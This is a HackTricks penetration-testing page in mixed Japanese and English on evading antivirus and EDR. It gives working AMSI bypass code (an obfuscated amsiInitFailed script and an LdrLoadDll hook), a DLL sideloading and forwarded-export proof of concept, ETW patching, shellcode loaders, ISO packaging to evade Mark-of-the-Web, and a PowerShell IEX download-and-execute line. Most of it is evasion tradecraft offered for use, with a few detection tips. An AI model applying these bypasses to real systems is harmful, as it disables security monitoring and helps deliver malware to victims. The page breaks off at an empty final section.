# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**が執筆しました！**

## Defender を停止する

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender が動作しないようにするツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を偽装して Windows Defender を停止させるツール。
- [管理者であれば Defender を無効化する方法](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

現在、AV はファイルが悪意あるかどうかを判定するために、静的検出、動的解析、そしてより高度な EDR による振る舞い解析といった異なる手法を使用しています。

### **Static detection**

Static detection は、バイナリやスクリプト内の既知の悪意ある文字列やバイト列をフラグ化したり、ファイル自体から情報を抽出することで行われます（例：file description、company name、digital signatures、icon、checksum 等）。そのため、既知の公開ツールを使用すると簡単に検出される可能性があり、解析・フラグ化されていることが多いです。この種の検出を回避する方法はいくつかあります。

- **Encryption**

バイナリを暗号化すれば、AV がプログラムを検出する方法は無くなりますが、メモリ内でプログラムを復号して実行するためのローダーが必要になります。

- **Obfuscation**

バイナリやスクリプト内のいくつかの文字列を変更するだけで AV をすり抜けられる場合もありますが、何を難読化するかによっては時間のかかる作業になることがあります。

- **Custom tooling**

独自ツールを開発すれば既知の悪いシグネチャは存在しませんが、これは多くの時間と労力を要します。

> [!TIP]
> Windows Defender の静的検出に対してチェックする良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) です。これはファイルを複数のセグメントに分割し、それぞれを Defender にスキャンさせることで、バイナリ内のどの文字列やバイトがフラグ化されているかを正確に教えてくれます。

実践的な AV Evasion に関するこの [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) はぜひ確認してください。

### **Dynamic analysis**

Dynamic analysis は、AV がバイナリをサンドボックス内で実行し、悪意ある活動（例：ブラウザのパスワードを復号して読み取ろうとする、LSASS に対して minidump を行う、など）を監視するプロセスです。ここはやや扱いにくい部分ですが、サンドボックスを回避するためにできることはいくつかあります。

- **Sleep before execution** 実装方法次第では、AV の動的解析を回避する優れた方法になり得ます。AV はユーザーの作業を妨げないためにファイルをスキャンする時間が非常に短いため、長い sleep を使うと解析を妨害できます。問題は、多くの AV のサンドボックスが実装次第では sleep をスキップしてしまうことです。
- **Checking machine's resources** 通常、サンドボックスは利用できるリソースが非常に少ないことが多いです（例：< 2GB RAM）。さもなければユーザーのマシンを遅くしてしまいます。ここでは非常に創造的になれます。例えば CPU の温度やファン速度をチェックするなど、サンドボックスで全てが実装されているとは限りません。
- **Machine-specific checks** ターゲットが "contoso.local" ドメインに参加しているワークステーションの場合、コンピュータのドメインをチェックして指定したものと一致するか確認し、一致しなければプログラムを終了させる、といったことができます。

実際、Microsoft Defender のサンドボックスの computername は HAL9TH なので、実行前にコンピュータ名をチェックして HAL9TH であれば Defender のサンドボックス内にいることになるため、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックス対策についての [@mgeeky](https://twitter.com/mariuszbit) からのその他の非常に有益なヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> の #malware-dev チャンネル</p></figcaption></figure>

前述の通り、**public tools** は最終的に **検出される** ので、自問するべきことがあります。

例えば、LSASS をダンプしたい場合、**本当に mimikatz を使う必要があるのか**？それとも、あまり知られていない別のプロジェクトで LSASS をダンプできるものはないのか。

正しい答えは後者であることが多いでしょう。mimikatz を例に取ると、AV や EDR に最もフラグ化されているツールの一つであり、プロジェクト自体は非常に優れているものの、AV を回避するために扱うのは悪夢のような作業になり得ます。したがって、達成したいことについて代替手段を探すべきです。

> [!TIP]
> 回避のためにペイロードを変更する際は、Defender の自動サンプル送信を必ずオフにしてください。また、長期的に回避を目指すのであれば、**絶対に VirusTotal にアップロードしないでください**。特定の AV による検出状況を確認したい場合は、VM にインストールして自動サンプル送信をオフにし、満足いく結果が出るまでそこでテストしてください。

## EXEs vs DLLs

可能な限り、回避のためには常に **DLLs の使用を優先** してください。私の経験では、DLL ファイルは通常 **検出されにくく** 解析されにくいことが多く、ペイロードが DLL として実行できるのであれば、検出を避けるための非常にシンプルなトリックになります。

この画像のように、Havoc の DLL ペイロードは antiscan.me での検出率が 4/26 であるのに対し、EXE ペイロードは 7/26 でした。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me における通常の Havoc EXE ペイロードと通常の Havoc DLL の比較</p></figcaption></figure>

ここからは、DLL ファイルを使ってよりステルスにするためのいくつかのトリックを紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、ローダーが使用する DLL 検索順序を悪用し、標的アプリケーションと悪意あるペイロードを同じ場所に配置することで成立します。

[Siofra](https://github.com/Cybereason/siofra) と以下の powershell スクリプトを使って、DLL Sideloading に脆弱なプログラムを確認できます。
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは "C:\Program Files\\" 内で DLL hijacking の対象となるプログラムと、それらがロードしようとする DLL ファイルの一覧を出力します。

自分で **DLL Hijackable/Sideloadable programs を調査することを強くお勧めします**。この手法は適切に行えば非常にステルス性がありますが、公開されている DLL Sideloadable programs を使うと簡単に検知される可能性があります。

プログラムがロードすることを期待する名前の悪意のある DLL を配置しただけではペイロードは実行されません。プログラムがその DLL 内に特定の関数を期待しているためです。この問題を解決するために、**DLL Proxying/Forwarding** という別の手法を使います。

**DLL Proxying** は、プログラムが行う呼び出しをプロキシ（および悪意のある）DLL から元の DLL に転送し、プログラムの機能を維持しつつペイロードの実行を処理できるようにします。

ここでは [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクト（作者 [@flangvik](https://twitter.com/Flangvik/)）を使用します。

以下が私が行った手順です：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは、2つのファイルを生成します: DLL のソースコードテンプレートと、リネームされた元の DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
これらが結果です：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我々の shellcode（[SGN](https://github.com/EgeBalci/sgn) でエンコード）と proxy DLL の両方が [antiscan.me](https://antiscan.me) で 0/26 の検出率でした！これは成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **強くおすすめします**：DLL Sideloading に関する [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) と [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) を視聴して、ここで議論した内容をより深く学んでください。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules は、実際には "forwarders" である関数をエクスポートすることができます。エクスポートエントリはコードを指す代わりに、`TargetDll.TargetFunc` の形式の ASCII 文字列を含みます。呼び出し側がエクスポートを解決すると、Windows loader は以下を行います：

- まだロードされていなければ `TargetDll` をロードする
- そこから `TargetFunc` を解決する

理解すべき重要な挙動：
- `TargetDll` が KnownDLL の場合、保護された KnownDLLs namespace（例：ntdll, kernelbase, ole32）から供給される。
- `TargetDll` が KnownDLL でない場合、通常の DLL 検索順序が使用され、その中にはフォワードを解決しているモジュールのディレクトリも含まれる。

これにより間接的な sideloading primitive が可能になります：署名された DLL を見つけ、そのエクスポートが非 KnownDLL モジュール名にフォワードされている関数をエクスポートしているものを特定し、その署名済み DLL と同じディレクトリにフォワード先のターゲットモジュールと全く同じ名前の攻撃者制御の DLL を配置します。フォワードされたエクスポートが呼び出されると、loader はフォワードを解決し、同じディレクトリからあなたの DLL をロードして DllMain を実行します。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順で解決されます。

PoC（コピー＆ペースト）:
1) 署名済みのシステム DLL を書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
同じフォルダに悪意のある `NCRYPTPROV.dll` を配置する。最小限の DllMain だけでコード実行が可能で、DllMain をトリガーするためにフォワードされた関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) サイン済みの LOLBin で forward をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
観察された動作:
- rundll32（署名済み）は side-by-side の `keyiso.dll`（署名済み）をロードします
- `KeyIsoSetAuditingInterface` を解決する際、ローダーはフォワード先の `NCRYPTPROV.SetAuditingInterface` を辿ります
- その後ローダーは `C:\test` から `NCRYPTPROV.dll` をロードし、`DllMain` を実行します
- `SetAuditingInterface` が実装されていない場合、`DllMain` 実行後に初めて "missing API" エラーが発生します

ハンティングのヒント:
- ターゲットモジュールが KnownDLL でない forwarded exports に注目してください。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に一覧されています。
- forwarded exports は次のようなツールで列挙できます:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を探すには Windows 11 forwarder のインベントリを参照: https://hexacorn.com/d/apis_fwd.txt

検出/防御のアイデア:
- LOLBins（例: rundll32.exe）が非システムパスから署名済みDLLをロードし、そのディレクトリから同じベース名の非KnownDLLsをロードする挙動を監視する
- ユーザー書き込み可能なパスにおける、以下のようなプロセス/モジュール連鎖に対してアラートを出す: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll`
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの書き込みと実行（write+execute）を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使って、shellcode をステルスにロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionは単なるイタチごっこです。今日有効なものが明日検出される可能性があるため、1つのツールにのみ頼らないでください。可能であれば、複数のevasion techniquesを連鎖させてみてください。

## AMSI (Anti-Malware Scan Interface)

AMSIは「fileless malware」を防ぐために作られました。元々、AVsはディスク上のファイルしかスキャンできなかったため、payloadsをin-memoryで直接実行できれば、AVは十分な可視性を持たず防げませんでした。

AMSIの機能はWindowsの以下のコンポーネントに組み込まれています。

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

スクリプト内容をアンオブフuscatedで平文の形で公開することで、アンチウイルスソリューションがスクリプトの振る舞いを検査できるようにします。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defenderで次のようなアラートが生成されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

実行元の実行可能ファイルのパス（この場合は powershell.exe）と共に `amsi:` を先頭に付けていることに注意してください。

ファイルをディスクに落としていなくても、AMSIのためにin-memoryで検出されてしまいました。

さらに、**.NET 4.8**以降では、C#コードもAMSIを通されます。これは `Assembly.Load(byte[])` によるin-memory実行にも影響します。したがって、AMSIを回避したい場合は、in-memory実行に .NET 4.7.2 以下などの低いバージョンを使うことが推奨されます。

AMSIを回避する方法はいくつかあります:

- **Obfuscation**

AMSIは主に静的検出で動作するため、読み込もうとするscriptsを変更することは検出回避の良い手段になり得ます。

ただし、AMSIは複数層のオブフuscationをアンオブフuscateする能力を持っているため、オブフuscationはやり方によっては悪手になる可能性があります。したがって回避はそれほど単純ではありません。ただし、変数名を少し変更するだけで回避できることもあるので、何がフラグされているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（および cscript.exe, wscript.exe など）プロセスにロードして実装されているため、権限の低いユーザであっても簡単に改竄することが可能です。このAMSIの実装上の欠陥により、研究者たちはAMSIスキャンを回避する複数の方法を発見しました。

**Forcing an Error**

AMSIの初期化を失敗させる（amsiInitFailed）と、現在のプロセスに対してスキャンが開始されなくなります。これは元々 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoftは広範な利用を防ぐためのシグネチャを作成しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell process で AMSI を無効化するのに必要だったのは、powershell code の一行だけでした。もちろんこの行は AMSI 自身によって検出されるため、この手法を使うには何らかの改変が必要です。

以下は私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から持ってきた改変済みの AMSI bypass です。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### AMSI を amsi.dll のロードを防いでブロックする (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

実装概要 (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell、WScript/CScript、カスタムローダーなど、AMSI を読み込むあらゆるもので動作します。
- stdin 経由でスクリプトを渡す（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせて使用し、長いコマンドラインの痕跡を避けてください。
- LOLBins 経由で実行されるローダー（例: `regsvr32` が `DllRegisterServer` を呼ぶ）で使用されているのが確認されています。

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**検出されたシグネチャを削除する**

現在のプロセスのメモリから検出された AMSI シグネチャを削除するために、**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** といったツールを使用できます。これらのツールは、現在のプロセスのメモリをスキャンして AMSI シグネチャを検出し、それを NOP 命令で上書きすることで、実質的にメモリから除去します。

**AMSI を使用する AV/EDR 製品**

AMSI を使用する AV/EDR 製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** にあります。

**PowerShell バージョン 2 を使用する**
PowerShell バージョン 2 を使用すると AMSI はロードされないため、スクリプトは AMSI によるスキャンを受けずに実行できます。次のように実行します:
```bash
powershell.exe -version 2
```
## PS ロギング

PowerShell ロギングはシステム上で実行されたすべての PowerShell コマンドを記録できる機能です。監査やトラブルシューティングに役立ちますが、**検出を回避したい攻撃者にとっては問題になる**こともあります。

PowerShell ロギングを回避するには、次の技術を使えます:

- **PowerShell Transcription と Module Logging を無効化する**: この目的には [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **PowerShell version 2 を使用する**: PowerShell version 2 を使うと AMSI はロードされないため、スクリプトは AMSI によるスキャンを受けずに実行できます。実行例: `powershell.exe -version 2`
- **Unmanaged Powershell Session を使う**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って防御のない powershell をスポーンします（これは Cobal Strike の `powerpick` が使う方法です）。


## 難読化

> [!TIP]
> 多くの難読化技術はデータを暗号化することに依存しており、それによりバイナリのエントロピーが上がり、AVs や EDRs に検出されやすくなります。これには注意し、暗号化は機密部分や隠す必要のあるコードの特定セクションにのみ適用することを検討してください。

### ConfuserEx 保護された .NET バイナリの難読化解除

ConfuserEx 2（または商用フォーク）を使ったマルウェアを解析すると、デコンパイラやサンドボックスを阻害する複数の保護層に遭遇するのが一般的です。以下のワークフローは、後で dnSpy や ILSpy などで C# にデコンパイルできる、ほぼ元の IL を確実に**復元**します。

1.  アンチタンパー除去 – ConfuserEx はすべての *method body* を暗号化し、*module* の static コンストラクタ（`<Module>.cctor`）内で復号します。これにより PE チェックサムもパッチされ、改変するとバイナリがクラッシュします。暗号化されたメタデータテーブルを特定し、XOR キーを回収してクリーンなアセンブリを書き直すために **AntiTamperKiller** を使用します:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には 6 つのアンチタンパーパラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれ、独自のアンパッカーを作る際に役立ちます。

2.  シンボル / 制御フローの回復 – *clean* ファイルを **de4dot-cex**（de4dot の ConfuserEx 対応フォーク）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
フラグ:
• `-p crx` – ConfuserEx 2 プロファイルを選択  
• de4dot は制御フローのフラッテン化を元に戻し、元の名前空間、クラス、変数名を復元し、定数文字列を復号します。

3.  プロキシコール除去 – ConfuserEx はデコンパイルをさらに難しくするために直接のメソッド呼び出しを軽量ラッパー（いわゆる *proxy calls*）に置き換えます。これらは **ProxyCall-Remover** で除去します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
このステップの後は、不透明なラッパー関数（`Class8.smethod_10` など）の代わりに `Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が見られるはずです。

4.  マニュアルクリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 ブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用を検索して *実際の* ペイロードを特定します。多くの場合、マルウェアはそれを `<Module>.byte_0` 内で初期化された TLV エンコードされたバイト配列として格納しています。

上記のチェーンは、悪意あるサンプルを実行することなく実行フローを復元します — オフラインのワークステーションで作業する際に有用です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これは IOC としてサンプルの自動トリアージに使えます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と改ざん防止を通じてソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は `C++11/14` 言語を使用して、外部ツールを使わずコンパイル時に obfuscated code を生成する方法を示します（コンパイラを変更することもありません）。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework によって生成される obfuscated operations のレイヤーを追加し、アプリケーションを解析しようとする人物の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 binary obfuscator で、.exe、.dll、.sys を含むさまざまな pe files を難読化することができます。
- [**metame**](https://github.com/a0rtega/metame): Metame は任意の実行ファイル向けのシンプルな metamorphic code engine です。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を使用した、LLVM-supported languages 向けの細粒度な code obfuscation framework です。ROPfuscator は通常の命令を ROP チェーンに変換することでアセンブリレベルでプログラムを難読化し、通常の制御フローに対する直感を覆します。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換し、それをロードすることができます。

## SmartScreen & MoTW

インターネットからいくつかの実行ファイルをダウンロードして実行したときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、潜在的に悪意のあるアプリケーションの実行からエンドユーザーを保護することを目的としたセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主にレピュテーションベースのアプローチで動作します。つまり、あまりダウンロードされていないアプリケーションは SmartScreen をトリガーし、ファイルの実行を警告・阻止します（ただしファイルは More Info -> Run anyway をクリックすれば実行可能です）。

**MoTW** (Mark of The Web) は Zone.Identifier という名前の [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、インターネットからファイルをダウンロードした際に、ダウンロード元の URL とともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認している様子。</p></figcaption></figure>

> [!TIP]
> 実行ファイルが **信頼された** 署名済み証明書で署名されている場合、**SmartScreen をトリガーしない** 点に注意してください。

payloads に Mark of The Web が付与されるのを防ぐ非常に効果的な方法は、ISO のようなコンテナにパッケージすることです。これは Mark-of-the-Web (MOTW) が **non NTFS** ボリュームには適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、payloads を出力コンテナにパッケージして Mark-of-the-Web を回避するツールです。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、Windows でアプリケーションやシステムコンポーネントが **イベントを記録** するための強力なロギング機構です。ただし、セキュリティ製品が悪意ある活動を監視・検出するために利用することもあります。

AMSI が無効化（バイパス）される方法と同様に、ユーザースペースプロセスの **`EtwEventWrite`** 関数をイベントをログせずに即座に戻すようにすることも可能です。これは関数をメモリ上でパッチし即座に return するようにすることで行われ、対象プロセスの ETW ログを事実上無効化します。

詳細は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) と [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# アセンブリ・リフレクション

C# バイナリをメモリにロードする手法は以前から知られており、post-exploitation ツールを AV に検出されずに実行する非常に有効な方法です。

ペイロードはディスクに触れず直接メモリにロードされるため、プロセス全体について AMSI をパッチすることだけを考慮すればよくなります。

ほとんどの C2 フレームワーク（sliver, Covenant, metasploit, CobaltStrike, Havoc など）は既に C# アセンブリをメモリ上で直接実行する機能を提供していますが、実行方法はいくつかあります:

- **Fork\&Run**

これは **新しい犠牲プロセスを生成** し、その新プロセスに post-exploitation の悪意あるコードを注入して実行し、完了後にそのプロセスを終了する方法です。利点と欠点の両方があります。Fork and Run の利点は実行が我々の Beacon implant プロセスの**外部**で発生する点です。つまり、post-exploitation の処理で何かが失敗したり検出されても、我々の**implant が生き残る**可能性が**はるかに高く**なります。欠点は **Behavioural Detections** によって検出される**可能性が高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これは post-exploitation の悪意あるコードを **自身のプロセスに注入** する方法です。これにより新しいプロセスを作成して AV にスキャンされるのを避けられますが、ペイロードの実行で何か問題が起きた場合、クラッシュして **beacon を失う**可能性が**はるかに高く**なります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# アセンブリのロードについて詳しく知りたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) とその InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を参照してください。

C# アセンブリは **PowerShell から** もロードできます。Invoke-SharpLoader (https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と S3cur3th1sSh1t の動画 (https://www.youtube.com/watch?v=oe11Q-3Akuk) をチェックしてください。

## 他のプログラミング言語の使用

提案されているように（[https://github.com/deeexcee-io/LOI-Bins](https://github.com/deeexcee-io/LOI-Bins)）、侵害されたマシンに **Attacker Controlled SMB share にインストールされたインタプリタ環境へのアクセス** を与えることで、他の言語を用いて悪意あるコードを実行することが可能です。

SMB 共有上のインタプリタバイナリと環境へのアクセスを許可することで、侵害されたマシンのメモリ内で **これらの言語で任意のコードを実行する** ことができます。

リポジトリには、Defender はスクリプトを引き続きスキャンするが、Go、Java、PHP 等を利用することで **静的シグネチャを回避する柔軟性が高まる** と記載されています。これらの言語でランダムな難読化されていないリバースシェルスクリプトをテストしたところ成功が確認されています。

## TokenStomping

Token stomping は攻撃者が **アクセス トークンや EDR や AV のようなセキュリティ製品を操作する** ことで、プロセスが終了しない程度に権限を低下させつつ、悪意ある活動をチェックする権限を与えないようにする手法です。

これを防ぐために、Windows はセキュリティプロセスのトークンに対して **外部プロセス** がハンドルを取得することを禁止することが考えられます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアの使用

### Chrome Remote Desktop

